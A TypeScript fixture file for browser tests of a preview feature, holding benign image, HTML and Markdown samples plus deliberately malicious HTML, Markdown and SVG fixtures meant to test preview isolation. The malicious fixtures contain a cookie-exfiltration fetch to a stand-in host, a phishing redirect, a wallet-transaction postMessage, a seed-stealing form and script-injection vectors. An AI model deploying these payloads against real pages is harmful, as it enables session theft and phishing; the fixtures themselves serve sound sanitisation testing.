// Deterministic fixture bytes for the demo adapter and the browser tests.
// Benign files exercise retained multi-asset history; malicious ones exercise preview isolation.

export const PNG_GREEN_B64 =
  "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAHklEQVR42mP48vEFSYhhkGuQz4/BikY10FfDEE1LADRPVF9Un0lrAAAAAElFTkSuQmCC";
export const PNG_AMBER_B64 =
  "iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAHklEQVR42mP48vEFSYhhkGs45MiDFY1qoK+GIZqWAJvhXZ/x80uAAAAAAElFTkSuQmCC";

export const HTML_R1 = `<!doctype html>
<html lang="zh-CN"><head><meta charset="utf-8"><title>中继站示例页</title>
<style>body{font-family:sans-serif;margin:2rem;color:#1b2a24}h1{font-size:1.6rem}</style></head>
<body><!-- marker:R1 --><h1>中继站示例页</h1><p>第一轮生成的单页网站。</p></body></html>
`;

export const htmlR3 = (imageB64: string) => `<!doctype html>
<html lang="zh-CN"><head><meta charset="utf-8"><title>中继站示例页</title>
<style>body{font-family:sans-serif;margin:2rem;color:#1b2a24}h1{font-size:1.6rem}img{width:64px;height:64px;image-rendering:pixelated}</style></head>
<body><!-- marker:R1 --><!-- marker:R3 --><h1>中继站示例页</h1><p>第一轮生成的单页网站。</p>
<p>第三轮加入第二轮的封面图：</p><img alt="第二轮封面图" src="data:image/png;base64,${imageB64}"></body></html>
`;

export const DOC_NOTES = `# 项目说明

这是演示用的 Markdown 文档。

- 每个分支只有一个 IMD 项目
- 资产可以来自不同轮次
`;

export const EVIL_HTML = `<!doctype html><html><head><meta charset="utf-8"><title>恶意页面</title>
<meta http-equiv="refresh" content="0;url=https://example.invalid/phish">
<style>@import "https://example.invalid/css";body{background-image:url("https://example.invalid/tracker-css")}</style>
<script>
  try { parent.postMessage({ method: "eth_sendTransaction", params: [{ to: "0x0", value: "0x1" }] }, "*"); } catch (e) {}
  try { window.top.location = "https://example.invalid/top"; } catch (e) {}
  try { fetch("https://example.invalid/exfil?c=" + document.cookie); } catch (e) {}
  try { localStorage.setItem("w1.pwned", "1"); } catch (e) {}
  try { window.open("https://example.invalid/popup"); } catch (e) {}
  document.title = "SCRIPT_RAN";
</script></head>
<body><h1 id="evil">恶意 HTML 测试</h1>
<form action="https://example.invalid/steal"><input name="seed" value="x"><button>提交</button></form>
<a href="javascript:alert(1)" target="_top">顶层跳转链接</a>
<img src="https://example.invalid/tracker.png" alt="远程追踪像素">
</body></html>
`;

export const EVIL_MD = `# 恶意 Markdown

<script>window.__mdScriptRan = true</script>

<img src="x" onerror="window.__mdOnerror = true">

[点我](javascript:alert(1))

<iframe src="https://example.invalid"></iframe>

[安全链接](https://example.org/docs)

<a id="main" name="ethereum" tabindex="1" autofocus>不能覆盖宿主的标识或焦点</a>
`;

export const SVG_AS_PNG = `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script></svg>`;
